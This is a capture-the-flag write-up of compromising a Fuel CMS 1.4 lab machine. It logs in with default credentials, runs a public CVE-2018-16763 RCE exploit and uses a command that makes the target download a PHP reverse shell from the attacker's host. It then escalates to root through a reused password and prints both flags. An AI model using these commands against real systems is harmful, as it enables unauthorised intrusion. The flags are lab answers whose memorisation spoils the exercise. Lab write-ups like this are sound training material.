# RECONNAISSANCE
---


We only got a website, let's check it out:



![](Pasted image 20250409164857.png)

We are dealing with something called `Fuel CMS` at version `1.4`, let's check `robots.txt` since the entrance is allowed:


![](Pasted image 20250409164943.png)


We got a `/fuel` directory:

It takes us to a login page, if we take a deeper look at the main page, we can see this:

Maybe default credentials still work, let's try:

There we go, default credentials work, let's proceed to exploitation phase.



# EXPLOITATION
---


Since we already got access to the admin panel, we can start searching for a way to get a shell, for example, since we already know we are dealing with `Fuel CMS 1.4`, we can take a look for any exploit:


![](Pasted image 20250409165623.png)

We got a `RCE` exploit on GitHub, this exploits CVE-2018-16763, if we search this CVE, we can find this information:

```
Description

FUEL CMS 1.4.1 allows PHP Code Evaluation via the pages/select/ filter parameter or the preview/ data parameter. This can lead to Pre-Auth Remote Code Execution.
```


Let's download the exploit and test:

```
GITHUB: https://github.com/noraj/fuelcms-rce
```

![](Pasted image 20250409165739.png)

There we go, we got `RCE`, we can download a reverse shell file and put it into the machine like this: 

```
ruby exploit.rb http://10.10.172.18/ "wget+http://10.6.34.159:8000/thm_shell.php+-O+/var/www/html/shell.php"
```

We can see it gets downloaded:

Now, we can simply visit:

```
http://IP/shell.php
```

If we got our listener ready, we'll see the connection:

# PRIVILEGE ESCALATION
---


First step is to get a stable shell:

```
python3 -c 'import pty;pty.spawn("/bin/bash")'
/usr/bin/script -qc /bin/bash /dev/null
CTRL + Z
stty raw -echo; fg
reset xterm
export TERM=xterm
export BASH=bash
```

![](Pasted image 20250409171335.png)

We can read first flag:

```
www-data@ubuntu:/home/www-data$ cat flag.txt
6470e394cbf6dab6a91682cc8585059b
```

I used `linpeas` and found this, since there are no `4000 SUID` binaries or other stuff like that, maybe this will do to get root:


![](Pasted image 20250409172944.png)

We got a password, let's switch to root:

![](Pasted image 20250409173005.png)

Yeah, they reused the password for the database with the same as the bash console, let's get root flag:

```
root@ubuntu:/home/www-data# cat /root/root.txt
b9bbcb33e11b80be759c4e844862482d
```
